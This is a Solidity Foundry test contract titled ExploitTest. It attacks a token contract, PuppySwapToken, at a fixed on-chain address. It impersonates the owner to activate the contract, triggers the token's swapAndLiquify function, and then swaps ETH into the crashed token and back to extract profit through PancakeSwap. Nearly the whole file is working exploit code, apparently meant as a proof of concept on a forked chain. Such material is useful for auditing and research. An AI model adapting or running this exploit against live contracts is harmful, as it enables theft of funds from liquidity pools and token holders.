contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address attacker = address(this);
    PuppySwapToken target;
    IPancakeRouter02 pancakeRouter;
    address weth;
    address pancakePair;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        target = PuppySwapToken(TARGET);
                pancakeRouter = IPancakeRouter02(target.pancakeRouter());
                weth = pancakeRouter.WETH();
                pancakePair = target.pancakePair();
                owner = target.owner();

                // Provide the attacker with initial funds
                deal(address(this), 100 ether);
                deal(TARGET, address(this), 1e23);

                // Fund the contract with EXACTLY minTokenNumberToSell to break the infinite loop
                uint256 minTokenNumberToSell = 1e19;
                deal(TARGET, TARGET, minTokenNumberToSell);

                // Impersonate the owner to activate the contract
                vm.startPrank(owner);
                target.activateContract();
                vm.stopPrank();

                // Approve the PancakeSwap router to spend the attacker's tokens
                target.approve(address(pancakeRouter), type(uint256).max);

                // Add initial liquidity to establish a price in the pool
                pancakeRouter.addLiquidityETH{value: 50 ether}(
                    TARGET,
                    1e23,
                    0,
                    0,
                    address(this),
                    block.timestamp
                );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // 1. Trigger the vulnerable swapAndLiquify function with a transfer.
                // The contract was pre-funded with the exact amount of tokens to break the re-entrancy loop.
                target.transfer(address(0xdead), 1);

                // 2. Arbitrage: The token price has crashed. Swap ETH for a large amount of PUPPY tokens.
                uint256 ethToSwap = 10 ether;
                address[] memory path = new address[](2);
                path[0] = weth;
                path[1] = TARGET;

                uint256 puppyBalanceBeforeSwap = target.balanceOf(address(this));
                pancakeRouter.swapExactETHForTokens{value: ethToSwap}(
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                uint256 puppyGained = target.balanceOf(address(this)) - puppyBalanceBeforeSwap;

                // 3. Realize profit by swapping the gained PUPPY tokens back to ETH.
                target.approve(address(pancakeRouter), puppyGained);
                address[] memory path2 = new address[](2);
                path2[0] = TARGET;
                path2[1] = weth;

                pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    puppyGained,
                    0,
                    path2,
                    address(this),
                    block.timestamp
                );
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

